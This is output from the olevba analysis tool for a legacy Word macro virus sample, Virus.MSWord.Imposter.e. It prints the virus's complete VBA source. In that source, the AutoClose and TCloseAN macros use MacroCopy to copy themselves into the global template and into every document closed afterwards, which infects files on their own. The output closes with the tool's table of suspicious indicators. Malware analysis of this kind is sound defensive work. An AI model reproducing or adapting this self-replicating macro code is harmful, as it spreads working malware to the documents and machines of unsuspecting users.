olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Imposter.e-9ebfc5dbf2829d734c56dfc21d56334a423651c9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Imposter.e-9ebfc5dbf2829d734c56dfc21d56334a423651c9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Imposter.e-9ebfc5dbf2829d734c56dfc21d56334a423651c9 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
Dim sMe$
Dim sMacro$
Dim ExecuteOnly
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "DCloseAN" Then
            bInstalled = -1
        End If
    Next i
    If Not bInstalled Then
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":TCloseAN"
        WordBasic.MacroCopy sMacro$, "AutoClose", ExecuteOnly
        sMacro$ = sMe$ + ":AutoClose"
        WordBasic.MacroCopy sMacro$, "DCloseAN", ExecuteOnly
        WordBasic.MsgBox "WORMY-1 by NAENBGOURSG", -2
                'by NAENBGOURSG
                'SO.HT.AI.KS
                '231076-GREECE
                'Thanks to NEURO
                'VRD 19-4-1997
                'VRP A.U.A (Ã.Ð.Á)
        End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO TCloseAN.bas 
in file: Virus.MSWord.Imposter.e-9ebfc5dbf2829d734c56dfc21d56334a423651c9 - OLE stream: 'Macros/VBA/TCloseAN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
WordBasic.FileSaveAs Format:=1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "DCloseAN", sTMacro$
sTMacro$ = sMe$ + ":TCloseAN"
WordBasic.MacroCopy "AutoClose", sTMacro$
WordBasic.FileSave
Bail:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

